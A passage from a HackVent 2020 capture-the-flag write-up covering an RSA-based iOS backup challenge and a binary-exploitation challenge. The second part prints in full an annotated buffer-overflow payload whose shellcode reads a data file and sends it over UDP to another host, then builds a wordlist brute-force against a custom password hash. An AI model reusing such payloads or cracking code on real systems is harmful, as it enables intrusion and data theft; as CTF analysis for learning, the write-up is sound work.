<span id="cb82-6"><a href="#cb82-6"></a><span class="dt">@@ -26,7 +26,7 @@ def AESUnwrap(kek, wrapped):</span></span>
<span id="cb82-7"><a href="#cb82-7"></a>         for i in reversed(xrange(1,n+1)):</span>
<span id="cb82-8"><a href="#cb82-8"></a>             todec = pack64bit(A ^ (n*j+i))</span>
<span id="cb82-9"><a href="#cb82-9"></a>             todec += pack64bit(R[i])</span>
<span id="cb82-10"><a href="#cb82-10"></a><span class="st">-            B = AES.new(kek).decrypt(todec)</span></span>
<span id="cb82-11"><a href="#cb82-11"></a><span class="va">+            B = AES.new(kek, AES.MODE_ECB).decrypt(todec)</span></span>
<span id="cb82-12"><a href="#cb82-12"></a>             A = unpack64bit(B[:8])</span>
<span id="cb82-13"><a href="#cb82-13"></a>             R[i] = unpack64bit(B[8:])</span></code></pre></div>
<p>Let's move on to decrypt the backup folder:</p>
<pre><code>python backup_tool.py ../../5e8dfbc7f9f29a7645d66ef70b6f2d3f5dad8583/
</code></pre>
<p>In the reconstructed backup, we find plenty of jpg files and sqlite files</p>
<div class="sourceCode" id="cb84"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb84-1"><a href="#cb84-1"></a><span class="co"># Find all image files (jpg, png, tiff, etc.) and print out their filename</span></span>
<span id="cb84-2"><a href="#cb84-2"></a><span class="kw">for</span> <span class="ex">f</span> in <span class="va">$(</span><span class="fu">find</span> -type f<span class="va">)</span><span class="kw">;</span> <span class="kw">do</span> <span class="va">$(</span><span class="fu">file</span> -b <span class="va">$f</span> <span class="kw">|</span> <span class="fu">grep</span> -qi <span class="st">&#39;image&#39;</span><span class="va">)</span> <span class="kw">||</span> <span class="bu">continue</span><span class="kw">;</span> <span class="bu">echo</span> <span class="va">$f</span><span class="kw">;</span> <span class="kw">done</span></span>
<span id="cb84-3"><a href="#cb84-3"></a><span class="co"># Find all SQLite files and dump them into a single file</span></span>
<span id="cb84-4"><a href="#cb84-4"></a><span class="kw">for</span> <span class="ex">f</span> in <span class="va">$(</span><span class="fu">find</span> -type f<span class="va">)</span><span class="kw">;</span> <span class="kw">do</span> <span class="va">$(</span><span class="fu">file</span> -b <span class="va">$f</span> <span class="kw">|</span> <span class="fu">grep</span> -qi <span class="st">&#39;sqlite&#39;</span><span class="va">)</span> <span class="kw">||</span> <span class="bu">continue</span><span class="kw">;</span> <span class="va">TABLES=$(</span><span class="ex">sqlite3</span> -list  <span class="va">$f</span> <span class="st">&#39;.tables&#39;</span><span class="va">)</span>; <span class="kw">for</span> <span class="ex">t</span> in <span class="va">$TABLES</span><span class="kw">;</span> <span class="kw">do</span> <span class="bu">echo</span> <span class="st">&quot;### </span><span class="va">$f</span><span class="st"> - </span><span class="va">$t</span><span class="st"> ###&quot;</span><span class="kw">;</span> <span class="ex">sqlite3</span> <span class="va">$f</span> <span class="st">&quot;select * from </span><span class="va">$t</span><span class="st">;&quot;</span><span class="kw">;</span> <span class="kw">done</span> ; <span class="kw">done</span> <span class="op">&gt;</span> <span class="ex">db.dump</span></span></code></pre></div>
<p>Looking at the images, a promising one jumped to my eyes: <code>./5e8dfbc7f9f29a7645d66ef70b6f2d3f5dad8583_extract/CameraRollDomain/Media/DCIM/100APPLE/IMG_0003.JPG</code> - which was unfortunately only Rick Astley singing his song... -_-</p>
<p>SQLite3 file <code>./5e8dfbc7f9f29a7645d66ef70b6f2d3f5dad8583_extract/HomeDomain/Library/AddressBook/AddressBook.sqlitedb</code> looks promising, too:</p>
<div class="sourceCode" id="cb85"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb85-1"><a href="#cb85-1"></a>sqlite<span class="op">&gt;</span> <span class="kw">select</span> <span class="op">*</span> <span class="kw">from</span> ABPerson;</span>
<span id="cb85-2"><a href="#cb85-2"></a><span class="dv">2</span>|M<span class="op">||||||||</span><span class="dv">6344440980251505214334711510534398387022222632429506422215055328147354699502</span>|<span class="dv">0</span><span class="op">||||||</span>A√ú|A√ú|<span class="dv">629844018</span>|<span class="dv">629844018</span><span class="op">||||</span>|<span class="dv">0</span><span class="op">||</span>|A|A|<span class="dv">0</span>|<span class="dv">0</span>|<span class="op">-</span><span class="dv">1</span><span class="op">||</span><span class="dv">1</span>|50808F95<span class="op">-</span>A166<span class="op">-</span><span class="dv">4290</span><span class="op">-</span>97D3<span class="op">-</span>3B9FA17073EB<span class="ch">:ABPerson</span><span class="op">||||||||</span>|</span>
<span id="cb85-3"><a href="#cb85-3"></a><span class="dv">3</span>|N<span class="op">||||||||</span><span class="dv">77534090655128210476812812639070684519317429042401383232913500313570136429769</span>|<span class="dv">0</span><span class="op">||||||</span>C√ú|C√ú|<span class="dv">629844041</span>|<span class="dv">629844090</span><span class="op">||||</span>|<span class="dv">0</span><span class="op">||</span>|C|C|<span class="dv">0</span>|<span class="dv">0</span>|<span class="op">-</span><span class="dv">1</span><span class="op">||</span><span class="dv">1</span>|315422BB<span class="op">-</span>B907<span class="op">-</span>425D<span class="op">-</span>9D68<span class="op">-</span>7A4D94906B1B<span class="ch">:ABPerson</span><span class="op">||||||||</span>|</span></code></pre></div>
<p><code>M</code> and <code>N</code> - remembering our hint to call Shamir, this could be an RSA message and a corresponding modulus (see <a href="https://en.wikipedia.org/wiki/RSA_(cryptosystem)#Operation">https://en.wikipedia.org/wiki/RSA_(cryptosystem)#Operation</a>).</p>
<p>In order to reverse the message to its original, the modulus must be factorizable so that we can derive the private key.</p>
<p>Note that a similar challenge appeared HackVent 2018 already and is nicely documented on <em>mcia's</em> blog: <a href="https://sigterm.ch/2018/12/25/hackvent-2018-write-up/#Hidden_Flag_3">https://sigterm.ch/2018/12/25/hackvent-2018-write-up/#Hidden_Flag_3</a></p>
<p>Using factorDB, we're able to quickly factorize the modulus: <a href="http://factordb.com/index.php?query=77534090655128210476812812639070684519317429042401383232913500313570136429769">http://factordb.com/index.php?query=77534090655128210476812812639070684519317429042401383232913500313570136429769</a>, giving us <code>p</code> and <code>q</code>:</p>
<pre><code>p: 250036537280588548265467573745565999443
q: 310091043086715822123974886007224132083
</code></pre>
<p>We also assume <code>e</code> to be 65537, as this is a common value for the parameter.</p>
<p>With that, we can now write a solver in python doing the math for us:</p>
<ul>
<li>compute <code>phi</code></li>
<li>compute the inverse of <code>e</code> given <code>phi</code>, being <code>d</code></li>
<li>decrypt <code>m</code> given <code>d</code> and <code>n</code></li>
</ul>
<p>...which results in the flag.</p>
<p>The solver script looks as follows:</p>
<div class="sourceCode" id="cb87"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb87-1"><a href="#cb87-1"></a><span class="im">import</span> gmpy2</span>
<span id="cb87-2"><a href="#cb87-2"></a><span class="im">import</span> binascii</span>
<span id="cb87-3"><a href="#cb87-3"></a></span>
<span id="cb87-4"><a href="#cb87-4"></a>m <span class="op">=</span> <span class="dv">6344440980251505214334711510534398387022222632429506422215055328147354699502</span></span>
<span id="cb87-5"><a href="#cb87-5"></a>n <span class="op">=</span> <span class="dv">77534090655128210476812812639070684519317429042401383232913500313570136429769</span></span>
<span id="cb87-6"><a href="#cb87-6"></a>p <span class="op">=</span> <span class="dv">250036537280588548265467573745565999443</span></span>
<span id="cb87-7"><a href="#cb87-7"></a>q <span class="op">=</span> <span class="dv">310091043086715822123974886007224132083</span></span>
<span id="cb87-8"><a href="#cb87-8"></a>e <span class="op">=</span> <span class="dv">65537</span></span>
<span id="cb87-9"><a href="#cb87-9"></a></span>
<span id="cb87-10"><a href="#cb87-10"></a><span class="co">&#39;&#39;&#39;</span></span>
<span id="cb87-11"><a href="#cb87-11"></a><span class="co">Credits: https://sigterm.ch/2018/12/25/hackvent-2018-write-up/#Hidden_Flag_3</span></span>
<span id="cb87-12"><a href="#cb87-12"></a><span class="co">m^d % n</span></span>
<span id="cb87-13"><a href="#cb87-13"></a><span class="co">x^e % n = m</span></span>
<span id="cb87-14"><a href="#cb87-14"></a></span>
<span id="cb87-15"><a href="#cb87-15"></a><span class="co">&#39;&#39;&#39;</span></span>
<span id="cb87-16"><a href="#cb87-16"></a></span>
<span id="cb87-17"><a href="#cb87-17"></a><span class="kw">def</span> encrypt(e, n, message):</span>
<span id="cb87-18"><a href="#cb87-18"></a>    <span class="cf">return</span> <span class="bu">pow</span>(<span class="bu">int</span>(message.encode(<span class="st">&quot;hex&quot;</span>), <span class="dv">16</span>), e, n)</span>
<span id="cb87-19"><a href="#cb87-19"></a> </span>
<span id="cb87-20"><a href="#cb87-20"></a> </span>
<span id="cb87-21"><a href="#cb87-21"></a><span class="kw">def</span> decrypt(d, n, message):</span>
<span id="cb87-22"><a href="#cb87-22"></a>    res <span class="op">=</span> <span class="bu">pow</span>(message, d, n)</span>
<span id="cb87-23"><a href="#cb87-23"></a>    <span class="cf">return</span> binascii.unhexlify(<span class="st">&#39;</span><span class="sc">{0:02x}</span><span class="st">&#39;</span>.<span class="bu">format</span>(res))</span>
<span id="cb87-24"><a href="#cb87-24"></a></span>
<span id="cb87-25"><a href="#cb87-25"></a>phi <span class="op">=</span> (p<span class="dv">-1</span>) <span class="op">*</span> (q<span class="dv">-1</span>)</span>
<span id="cb87-26"><a href="#cb87-26"></a>d <span class="op">=</span> gmpy2.invert(e, phi)</span>
<span id="cb87-27"><a href="#cb87-27"></a>plain <span class="op">=</span> decrypt(d, n, m)</span>
<span id="cb87-28"><a href="#cb87-28"></a></span>
<span id="cb87-29"><a href="#cb87-29"></a><span class="bu">print</span>(plain)</span></code></pre></div>
<h2 id="flag-22">Flag</h2>
<p><code>HV20{s0rry_n0_gam3_to_play}</code></p>
<h1 id="hv2024-santas-secure-data-storage">HV20.24 Santa's Secure Data Storage</h1>
<table>
<thead>
<tr class="header">
<th><!-- --></th>
<th><!-- --></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>Author</strong></td>
<td>scryh</td>
</tr>
<tr class="even">
<td><strong>Level</strong></td>
<td>leet</td>
</tr>
<tr class="odd">
<td><strong>Categories</strong></td>
<td><code>crypto</code>, <code>exploitation</code>, <code>network security</code>, <code>reverse engineering</code></td>
</tr>
</tbody>
</table>
<h2 id="description-23">Description</h2>
<p>In order to prevent the leakage of any flags, Santa decided to instruct his elves to implement a secure data storage, which encrypts all entered data before storing it to disk.</p>
<p>According to the paradigm <em>Always implement your own crypto</em> the elves designed a custom hash function for storing user passwords as well as a custom stream cipher, which is used to encrypt the stored data.</p>
<p>Santa is very pleased with the work of the elves and stores a flag in the application. For his password he usually uses the secure password generator <code>shuf -n1 rockyou.txt</code>.</p>
<p>Giving each other a pat on the back for the good work the elves lean back in their chairs relaxedly, when suddenly the intrusion detection system raises an alert: the application seems to be exploited remotely!</p>
<h3 id="mission-2">Mission</h3>
<p>Santa and the elves need your help!</p>
<p>The intrusion detection system captured the network traffic of the whole attack.</p>
<p>How did the attacker got in? Was (s)he able to steal the flag?</p>
<p><a href="./66aeb596-2ba0-4d07-a8de-3eb27eedb791.zip">Download</a></p>
<h2 id="approach-22">Approach</h2>
<h3 id="analysis-1">Analysis</h3>
<p>In the recorded network traffic, we can observe like some client (192.168.0.42:44740) logs in to Santa's system (192.168.0.1:5555) using credentials <code>evil0r:lovebug1</code> and quits the application again by submitting <code>3</code> followed by some exploit payload, apparently:</p>
<pre><code>0000   33 20 41 41 41 41 41 41 41 41 41 41 41 41 41 41   3 AAAAAAAAAAAAAA
0010   41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41   AAAAAAAAAAAAAAAA
0020   41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41   AAAAAAAAAAAAAAAA
0030   41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41   AAAAAAAAAAAAAAAA
0040   41 41 10 41 40 00 00 00 00 00 68 74 78 74 00 48   AA.A@.....htxt.H
0050   bf 74 61 5f 64 61 74 61 2e 57 48 bf 64 61 74 61   .ta_data.WH.data
0060   2f 73 61 6e 57 48 89 e7 48 31 f6 48 31 d2 b8 02   /sanWH..H1.H1...
0070   00 00 00 0f 05 48 89 c7 48 ba 00 00 01 00 01 00   .....H..H.......
0080   00 00 52 6a 00 6a 00 6a 00 6a 00 48 89 e6 48 ba   ..Rj.j.j.j.H..H.
0090   01 00 00 00 00 00 00 20 52 48 ba 00 00 00 13 37   ....... RH.....7
00a0   01 00 00 52 ba 20 00 00 00 b8 00 00 00 00 0f 05   ...R. ..........
00b0   48 31 c9 81 34 0e ef be ad de 48 83 c1 04 48 83   H1..4.....H...H.
00c0   f9 20 75 ef bf 02 00 00 00 be 02 00 00 00 48 31   . u...........H1
00d0   d2 b8 29 00 00 00 0f 05 48 89 c7 48 89 e6 48 83   ..).....H..H..H.
00e0   c6 03 ba 32 00 00 00 41 ba 00 00 00 00 6a 00 49   ...2...A.....j.I
00f0   b8 02 00 00 35 c0 a8 00 2a 41 50 49 89 e0 41 b9   ....5...*API..A.
0100   10 00 00 00 b8 2c 00 00 00 0f 05 bf 00 00 00 00   .....,..........
0110   b8 3c 00 00 00 0f 05 0a                           .&lt;......
</code></pre>
<p>The connection then is terminated, however Santa's system follows up with a DNS request (UDP, port 53) towards the client with some odd looking request payload:</p>
<pre><code>0000   13 37 01 00 00 01 00 00 00 00 00 00               .7..........
000c                                       20                               // Indicates the length of the request
000d                                          e5 af e5                ...   // DNS request payload
0010   9d 31 ac a3 ca 21 1e c3 79 a6 73 23 5e da b6 a0   .1...!..y.s#^...
0020   8d 2e d3 b7 b6 6b 55 85 7e c8 34 22 7a            .....kU.~.4&quot;z
002d                                          00                      .     // Request payload terminator
002e                                             00 01                 ..   
0030   00 01                                             ..
</code></pre>
<p>Analysing the binary using Ghidra, it looks like <code>show_menu</code> is the core menu function, allowing to either show, enter or delete data or to quit the program.</p>
<p>It reads in 1000 chars to a variable with length 10 and saves them on the stack, condsidering only the very first character.</p>
<p>First, I decided to reverse the shell code, and have a look at what it does. Next I looked at the binary program to find out which part is exploitable.</p>
<p>From this very first analysis, it looks a lot like there's a buffer overflow happening, but let's see.</p>
<h3 id="reverse-the-shell-code">Reverse the shell code</h3>
<p>Using <code>xxd</code> I dumped the shell code into an own binary which I loaded into Ghidra to see what it gives. To my surprise, Ghidra managed to make sense out of it.</p>
<p>In parallel, I had a sneak peek at where the shell code hooks in - which is in the <code>show_menu</code> function. The <code>show_menu</code> function defines 3 variables, all in all taking up 66 bytes on the stack.</p>
<p>The shell code is prefixed by 66 characters to override the variables on the stack and the return address.</p>
<pre><code>0000   33 20 41 41 41 41 41 41 41 41 41 41 41 41 41 41   3 AAAAAAAAAAAAAA
0010   41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41   AAAAAAAAAAAAAAAA   // 66 (0x42) characters (overriding local variables in `show_menu` function)
0020   41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41   AAAAAAAAAAAAAAAA
0030   41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41   AAAAAAAAAAAAAAAA
0040   41 41                                             AA
0042         10 41 40 00 00 00 00 00                       .A@.....         // Overrides return address to point to 0x00404110
004e                                 68 74 78 74 00 48             htxt.H   // Start of shell code
0050   bf 74 61 5f 64 61 74 61 2e 57 48 bf 64 61 74 61   .ta_data.WH.data
0060   2f 73 61 6e 57 48 89 e7 48 31 f6 48 31 d2 b8 02   /sanWH..H1.H1...
0070   00 00 00 0f 05 48 89 c7 48 ba 00 00 01 00 01 00   .....H..H.......
0080   00 00 52 6a 00 6a 00 6a 00 6a 00 48 89 e6 48 ba   ..Rj.j.j.j.H..H.
0090   01 00 00 00 00 00 00 20 52 48 ba 00 00 00 13 37   ....... RH.....7
00a0   01 00 00 52 ba 20 00 00 00 b8 00 00 00 00 0f 05   ...R. ..........
00b0   48 31 c9 81 34 0e ef be ad de 48 83 c1 04 48 83   H1..4.....H...H.
00c0   f9 20 75 ef bf 02 00 00 00 be 02 00 00 00 48 31   . u...........H1
00d0   d2 b8 29 00 00 00 0f 05 48 89 c7 48 89 e6 48 83   ..).....H..H..H.
00e0   c6 03 ba 32 00 00 00 41 ba 00 00 00 00 6a 00 49   ...2...A.....j.I
00f0   b8 02 00 00                                       ....
00f4               35                                        5              // Destination port
00f5                  c0 a8 00 2a                             ...*          // Destination address
009                               41 50 49 89 e0 41 b9            API..A.   
0100   10 00 00 00 b8 2c 00 00 00 0f 05 bf 00 00 00 00   .....,..........
0110   b8 3c 00 00 00 0f 05 0a                           .&lt;......
</code></pre>
<p>The binary starting at 0x4a invokes the following syscalls (see <a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</a>) in that order:</p>
<ul>
<li>2 --&gt; sys_open (the file at "data/santa_data.txt")</li>
<li>0 --&gt; sys_read</li>
<li>29 --&gt; sys_socket</li>
<li>2c --&gt; sys_sendto</li>
<li>3c --&gt; sys_exit</li>
</ul>
<p>The shellcode opens <code>data/santa_data.txt</code> and reads out 32 bytes (XORed with <code>0xdeadbeef</code>). The data is then sent to the indicated address through UDP on port 53.</p>
<h3 id="reverse-the-application-logic">Reverse the application logic</h3>
<p>Useful resources for reversing logic represented in assembly:</p>
<ul>
<li>Registers: <a href="https://wiki.cdot.senecacollege.ca/wiki/X86_64_Register_and_Instruction_Quick_Start">https://wiki.cdot.senecacollege.ca/wiki/X86_64_Register_and_Instruction_Quick_Start</a></li>
<li>ASM: <a href="https://www.felixcloutier.com/x86/lea">https://www.felixcloutier.com/x86/lea</a></li>
</ul>
<p>After reading the username (function <code>login_username</code>) and the password (function <code>login_password</code> which invokes <code>check_pwd</code> which invokes <code>calc_hash</code>), the central function is <code>show_menu</code>.</p>
<p>When the user selects to show decrypted data, the function <code>show_data</code> is invoked. <code>show_data</code> uses <code>decrypt</code>, which relies on <code>keystream_get_char</code>.</p>
<pre><code>login_password()
  `--&gt; check_pwd(pwd_filename, pwd)
    `--&gt; calc_hash(pwd, pwd_length)

show_data(filename)
  `--&gt; decrypt(ctx,pwd_hash); // ctx contains encrypted data
    `--&gt; keystream_get_char(pwd_hash, count)
</code></pre>
<p>The functions to be reversed thus are <code>keystream_get_char</code>, <code>decrypt</code> and <code>calc_hash</code>. They are needed to brute-force decrypting the encrypted data.</p>
<p>I re-implemented the logic of these three functions in python. For large parts, Ghidra decompiled a nice representation in C, so re-implementing was relatively easy. Shortcuts were taken in the <code>keystream_get_char</code> function as all this bitshifting was negligeable:</p>
<div class="sourceCode" id="cb92"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb92-1"><a href="#cb92-1"></a><span class="co">#!/usr/bin/env python</span></span>
<span id="cb92-2"><a href="#cb92-2"></a><span class="im">import</span> binascii</span>
<span id="cb92-3"><a href="#cb92-3"></a></span>
<span id="cb92-4"><a href="#cb92-4"></a>t <span class="op">=</span> b<span class="st">&#39;</span><span class="ch">\xde\xad\xbe\xef\xc0\x12\x34\x56\x78\x9a</span><span class="st">&#39;</span></span>
<span id="cb92-5"><a href="#cb92-5"></a></span>
<span id="cb92-6"><a href="#cb92-6"></a><span class="kw">def</span> keystream_get_char(count, pwd_hash):</span>
<span id="cb92-7"><a href="#cb92-7"></a>    c <span class="op">=</span> pwd_hash[count <span class="op">&amp;</span> <span class="bn">0xf</span>]</span>
<span id="cb92-8"><a href="#cb92-8"></a>    b <span class="op">=</span> t[c <span class="op">%</span> <span class="dv">10</span>]</span>
<span id="cb92-9"><a href="#cb92-9"></a>    <span class="cf">return</span> b <span class="op">^</span> c <span class="op">^</span> count</span>
<span id="cb92-10"><a href="#cb92-10"></a></span>
<span id="cb92-11"><a href="#cb92-11"></a><span class="kw">def</span> decrypt(encrypted_data, pwd_hash):</span>
<span id="cb92-12"><a href="#cb92-12"></a>    decrypted_data <span class="op">=</span> <span class="st">&#39;&#39;</span></span>
<span id="cb92-13"><a href="#cb92-13"></a>    <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="bu">len</span>(encrypted_data)):</span>
<span id="cb92-14"><a href="#cb92-14"></a>        val <span class="op">=</span> keystream_get_char(i,pwd_hash)</span>
<span id="cb92-15"><a href="#cb92-15"></a>        decrypted_data <span class="op">+=</span> <span class="bu">chr</span>(encrypted_data[i] <span class="op">^</span> val)</span>
<span id="cb92-16"><a href="#cb92-16"></a>    <span class="cf">return</span> decrypted_data</span>
<span id="cb92-17"><a href="#cb92-17"></a></span>
<span id="cb92-18"><a href="#cb92-18"></a>BYTEORDER <span class="op">=</span> <span class="st">&#39;little&#39;</span></span>
<span id="cb92-19"><a href="#cb92-19"></a></span>
<span id="cb92-20"><a href="#cb92-20"></a><span class="kw">def</span> calc_hash(pwd):</span>
<span id="cb92-21"><a href="#cb92-21"></a>    local_58 <span class="op">=</span> binascii.unhexlify(<span class="st">&#39;68617368&#39;</span>)</span>
<span id="cb92-22"><a href="#cb92-22"></a>    local_50 <span class="op">=</span> binascii.unhexlify(<span class="st">&#39;efbeadde&#39;</span>)</span>
<span id="cb92-23"><a href="#cb92-23"></a>    local_48 <span class="op">=</span> binascii.unhexlify(<span class="st">&#39;6d6f7265&#39;</span>)</span>
<span id="cb92-24"><a href="#cb92-24"></a>    local_40 <span class="op">=</span> binascii.unhexlify(<span class="st">&#39;eefe0fc0&#39;</span>)</span>
<span id="cb92-25"><a href="#cb92-25"></a>    local_10 <span class="op">=</span> binascii.unhexlify(<span class="st">&#39;68617368&#39;</span>)</span>
<span id="cb92-26"><a href="#cb92-26"></a>    local_18 <span class="op">=</span> binascii.unhexlify(<span class="st">&#39;efbeadde&#39;</span>)</span>
<span id="cb92-27"><a href="#cb92-27"></a>    local_20 <span class="op">=</span> binascii.unhexlify(<span class="st">&#39;6d6f7265&#39;</span>)</span>
<span id="cb92-28"><a href="#cb92-28"></a>    local_28 <span class="op">=</span> binascii.unhexlify(<span class="st">&#39;eefe0fc0&#39;</span>)</span>
<span id="cb92-29"><a href="#cb92-29"></a></span>
<span id="cb92-30"><a href="#cb92-30"></a>    <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="bu">len</span>(pwd)):</span>
<span id="cb92-31"><a href="#cb92-31"></a>        c <span class="op">=</span> <span class="bu">int</span>(pwd[i])</span>
<span id="cb92-32"><a href="#cb92-32"></a></span>
<span id="cb92-33"><a href="#cb92-33"></a>        local_50 <span class="op">=</span> <span class="bu">int</span>.to_bytes(<span class="bu">int</span>.from_bytes(local_10, BYTEORDER) <span class="op">^</span> (c <span class="op">*</span> i <span class="op">&amp;</span> <span class="bn">0xff</span> <span class="op">^</span> c <span class="op">|</span></span>
<span id="cb92-34"><a href="#cb92-34"></a>                               (c <span class="op">*</span> (i <span class="op">+</span> <span class="bn">0x31</span>) <span class="op">&amp;</span> <span class="bn">0xff</span> <span class="op">^</span> c) <span class="op">&lt;&lt;</span> <span class="bn">0x18</span> <span class="op">|</span></span>
<span id="cb92-35"><a href="#cb92-35"></a>                               (c <span class="op">*</span> (i <span class="op">+</span> <span class="bn">0x42</span>) <span class="op">&amp;</span> <span class="bn">0xff</span> <span class="op">^</span> c) <span class="op">&lt;&lt;</span> <span class="bn">0x10</span> <span class="op">|</span></span>
<span id="cb92-36"><a href="#cb92-36"></a>                               (c <span class="op">*</span> (i <span class="op">+</span> <span class="bn">0xef</span>) <span class="op">&amp;</span> <span class="bn">0xff</span> <span class="op">^</span> c) <span class="op">&lt;&lt;</span> <span class="bn">0x8</span>), <span class="dv">4</span>, BYTEORDER)</span>
<span id="cb92-37"><a href="#cb92-37"></a>        local_48 <span class="op">=</span> <span class="bu">int</span>.to_bytes(<span class="bu">int</span>.from_bytes(local_18, BYTEORDER) <span class="op">^</span> (c <span class="op">*</span> i <span class="op">&amp;</span> <span class="bn">0x5a</span> <span class="op">^</span> c <span class="op">|</span></span>
<span id="cb92-38"><a href="#cb92-38"></a>                               (c <span class="op">*</span> (i <span class="op">+</span> <span class="bn">0xc0</span>) <span class="op">&amp;</span> <span class="bn">0xff</span> <span class="op">^</span> c) <span class="op">&lt;&lt;</span> <span class="bn">0x18</span> <span class="op">|</span></span>
<span id="cb92-39"><a href="#cb92-39"></a>                               (c <span class="op">*</span> (i <span class="op">+</span> <span class="bn">0x11</span>) <span class="op">&amp;</span> <span class="bn">0xff</span> <span class="op">^</span> c) <span class="op">&lt;&lt;</span> <span class="bn">0x10</span> <span class="op">|</span></span>
<span id="cb92-40"><a href="#cb92-40"></a>                               (c <span class="op">*</span> (i <span class="op">+</span> <span class="bn">0xde</span>) <span class="op">&amp;</span> <span class="bn">0xff</span> <span class="op">^</span> c) <span class="op">&lt;&lt;</span> <span class="bn">0x8</span>), <span class="dv">4</span>, BYTEORDER)</span>
<span id="cb92-41"><a href="#cb92-41"></a>        local_40 <span class="op">=</span> <span class="bu">int</span>.to_bytes(<span class="bu">int</span>.from_bytes(local_20, BYTEORDER) <span class="op">^</span> (c <span class="op">*</span> i <span class="op">&amp;</span> <span class="bn">0x22</span> <span class="op">^</span> c <span class="op">|</span></span>
<span id="cb92-42"><a href="#cb92-42"></a>                               (c <span class="op">*</span> (i <span class="op">+</span> <span class="bn">0xe3</span>) <span class="op">&amp;</span> <span class="bn">0xff</span> <span class="op">^</span> c) <span class="op">&lt;&lt;</span> <span class="bn">0x18</span> <span class="op">|</span></span>
<span id="cb92-43"><a href="#cb92-43"></a>                               (c <span class="op">*</span> (i <span class="op">+</span> <span class="bn">0xde</span>) <span class="op">&amp;</span> <span class="bn">0xff</span> <span class="op">^</span> c) <span class="op">&lt;&lt;</span> <span class="bn">0x10</span> <span class="op">|</span></span>
<span id="cb92-44"><a href="#cb92-44"></a>                               (c <span class="op">*</span> (i <span class="op">+</span> <span class="bn">0xd</span>) <span class="op">&amp;</span> <span class="bn">0xff</span> <span class="op">^</span> c) <span class="op">&lt;&lt;</span> <span class="bn">0x8</span>), <span class="dv">4</span>, BYTEORDER)</span>
<span id="cb92-45"><a href="#cb92-45"></a>        local_58 <span class="op">=</span> <span class="bu">int</span>.to_bytes(<span class="bu">int</span>.from_bytes(local_28, BYTEORDER) <span class="op">^</span> (c <span class="op">*</span> i <span class="op">&amp;</span> <span class="bn">0xef</span> <span class="op">^</span> c <span class="op">|</span></span>
<span id="cb92-46"><a href="#cb92-46"></a>                               (c <span class="op">*</span> (i <span class="op">+</span> <span class="bn">0x52</span>) <span class="op">&amp;</span> <span class="bn">0xff</span> <span class="op">^</span> c) <span class="op">&lt;&lt;</span> <span class="bn">0x18</span> <span class="op">|</span></span>
<span id="cb92-47"><a href="#cb92-47"></a>                               (c <span class="op">*</span> (i <span class="op">+</span> <span class="bn">0x24</span>) <span class="op">&amp;</span> <span class="bn">0xff</span> <span class="op">^</span> c) <span class="op">&lt;&lt;</span> <span class="bn">0x10</span> <span class="op">|</span></span>
<span id="cb92-48"><a href="#cb92-48"></a>                               (c <span class="op">*</span> (i <span class="op">+</span> <span class="bn">0x33</span>) <span class="op">&amp;</span> <span class="bn">0xff</span> <span class="op">^</span> c) <span class="op">&lt;&lt;</span> <span class="bn">0x8</span>), <span class="dv">4</span>, BYTEORDER)</span>
<span id="cb92-49"><a href="#cb92-49"></a>        local_28 <span class="op">=</span> local_58</span>
<span id="cb92-50"><a href="#cb92-50"></a>        local_20 <span class="op">=</span> local_40</span>
<span id="cb92-51"><a href="#cb92-51"></a>        local_18 <span class="op">=</span> local_48</span>
<span id="cb92-52"><a href="#cb92-52"></a>        local_10 <span class="op">=</span> local_50</span>
<span id="cb92-53"><a href="#cb92-53"></a></span>
<span id="cb92-54"><a href="#cb92-54"></a>    <span class="cf">return</span> local_58 <span class="op">+</span> local_50 <span class="op">+</span> local_48 <span class="op">+</span> local_40</span></code></pre></div>
<p>Operator precedence (in descending order):</p>
<ul>
<li><ul>
<li>/ % (multiplication, division remainder)</li>
</ul></li>
<li><ul>
<li>addition</li>
</ul></li>
<li>&lt;&lt; bitwise shift</li>
<li>&amp; bitwise AND</li>
<li>^ bitwise XOR</li>
<li>| bitwise OR</li>
</ul>
<p>The functions were re-combined to compute a hash from a given password and use the hash to decrypt the data. To know when to exit, I test for the string to start with <code>HV20</code>.</p>
<p>The wordlist to iterate through, as hinted by the challenge description, is the famous rockyou.txt wordlist.</p>
<div class="sourceCode" id="cb93"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb93-1"><a href="#cb93-1"></a><span class="kw">def</span> main():</span>
<span id="cb93-2"><a href="#cb93-2"></a>    flag_enc_enc <span class="op">=</span> binascii.unhexlify(<span class="st">&#39;e5afe59d31aca3ca211ec379a673235edab6a08d2ed3b7b66b55857ec834227a&#39;</span>)</span>
<span id="cb93-3"><a href="#cb93-3"></a>    flag_enc <span class="op">=</span> b<span class="st">&#39;&#39;</span></span>
<span id="cb93-4"><a href="#cb93-4"></a>    <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">0</span>, <span class="bu">len</span>(flag_enc_enc), <span class="dv">4</span>):</span>
<span id="cb93-5"><a href="#cb93-5"></a>        data <span class="op">=</span> flag_enc_enc[i:i<span class="op">+</span><span class="dv">4</span>]</span>
<span id="cb93-6"><a href="#cb93-6"></a>        flag_enc <span class="op">+=</span> <span class="bu">int</span>.to_bytes(<span class="bu">int</span>.from_bytes(data, <span class="st">&#39;big&#39;</span>) <span class="op">^</span> <span class="bu">int</span>.from_bytes(b<span class="st">&#39;</span><span class="ch">\xde\xad\xbe\xef</span><span class="st">&#39;</span>, <span class="st">&#39;little&#39;</span>), <span class="dv">4</span>, <span class="st">&#39;big&#39;</span>)</span>
<span id="cb93-7"><a href="#cb93-7"></a></span>
<span id="cb93-8"><a href="#cb93-8"></a>    <span class="cf">with</span> <span class="bu">open</span>(<span class="st">&#39;rockyou.txt&#39;</span>, <span class="st">&#39;r&#39;</span>, errors<span class="op">=</span><span class="st">&#39;ignore&#39;</span>) <span class="im">as</span> fd:</span>
